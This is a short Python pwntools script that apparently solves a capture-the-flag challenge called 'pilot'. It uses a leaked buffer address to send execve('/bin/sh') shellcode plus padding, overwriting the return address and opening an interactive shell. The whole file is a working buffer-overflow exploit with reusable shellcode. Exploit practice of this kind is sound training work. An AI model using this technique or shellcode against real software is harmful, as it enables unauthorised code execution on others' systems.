#!/usr/bin/python3
from pwn import *
# Connect to target process
target = process('./pilot')
# 64 characters are read into a 32 bit buffer
print(target.recvuntil("Location:").decode('utf-8'))
# The buffer we are writing into is given as location
buf = int(target.recvline().decode('utf-8').strip("\n"), 16)
log.info("Buffer at " + str(buf))
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
# Address after 40th character overwrites rsp
padding = b"\x90"*(40-24)
payload = shellcode + padding + p64(buf)
log.info("And we have a shell!")
# Send the payload
target.send(payload)
# Drop to an interactive shell so we can interact with our shell
target.interactive()

